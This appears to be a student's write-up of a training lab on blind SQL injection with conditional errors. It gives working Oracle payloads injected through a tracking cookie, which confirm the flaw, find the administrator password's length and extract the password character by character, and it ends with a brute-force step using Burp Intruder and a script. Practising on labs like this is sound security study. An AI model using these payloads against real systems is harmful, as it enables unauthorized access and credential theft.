# Lab: Blind SQL injection with conditional errors

vulnerable parameter - tracking cookie

End Goals:

- Output the administrator password
- Login as the administrator user

Analysis:

1- _Prove that parameter is vulnerable_

KlPjynD5MxkBOSEj'+order+by+1--; -> interpreted as sql code & number of columns is 1

KlPjynD5MxkBOSEj'+union+select+null-- -> 500 internal server error

TrackingId=KlPjynD5MxkBOSEj'+union+select+null+from+dual-- -> oracle

2- _Confirm that users table exists in the database_

'+union+select+null+from+users--; -> 200 ok -> users table exists

3- _Confirm that the administrator users exists in the database_

NOTE THAT : The previous payloads worked as well because when they goes wrong they raises Errors

so in case determining if the administrator exists in the database or not we need to enforce errors in the database
ex:

'+union+select+null+from+users+where+username='administrator'-- -> 200 ok

'+union+select+null+from+users+where+username='ayhaga'-- -> 200 ok !!

syntax for  conditional statement in sql

SELECT  CASE    WHEN    (condition )  THEN do_code_in_case_true ELSE do_code_in_case_false  END FROM dual

' union select  case when (username='administrator') then '' else to_char(1/0) end from users where username='administrator' -- -> 200 ok

' union select  case when (username='foo') then '' else to_char(1/0) end from users where username='administrator' -- -> 500 internal server error

in order to understand the previous payload we need to understand the execution of the query

- first  the engine tries to find a row that specify the WHERE condition
- if found any , then executes the select statement
- so in our case the following has been done
  - if there any row with username = "administrator" ? -> yes
  - then let's execute the select statement ... the select statement says that
  - if the user name = 'administrator' -> '' -> do nothing
  - if not raise error
another example:
'+union+select++case+when+(1%3d1)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 200 ok

'+union+select++case+when+(1%3d0)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 500 internal server error -> which meanse the

select statement gave been executed (we have inserted condition that raises error on purpose) , which means there is a row with username = 'administrator'

'+union+select++case+when+(1%3d0)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'ayhaga'+-- -> 200 ok

'+union+select++case+when+(1%3d1)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'ayhaga'+-- -> 200 ok

4- Determin length of password
'+union+select++case+when+(length(password)%3d1)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 500 internal server error

'+union+select++case+when+(length(password)%3d20)+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 200 ok

the length of the password is = 20 digit
<!-- ' select  case when (1=0) then '' else to_char(1/0) end from users where username='administrator' -- -->

5- Brute force the administrator password

'+union+select++case+when+(substr(password,1,1)%3d'a')+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 500 internal server error

'+union+select++case+when+(substr(password,1,1)%3d'2')+then+''+else+to_char(1/0)+end+from+users+where+username%3d'administrator'+-- -> 200 ok

substr("string" , start_position , size)
the first char is 2

- using intruder (cluster bomb)
1 2 3 4  5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
2            b                              e  e

-----
python script.py "url" "tracking id cookie" "session cookie"
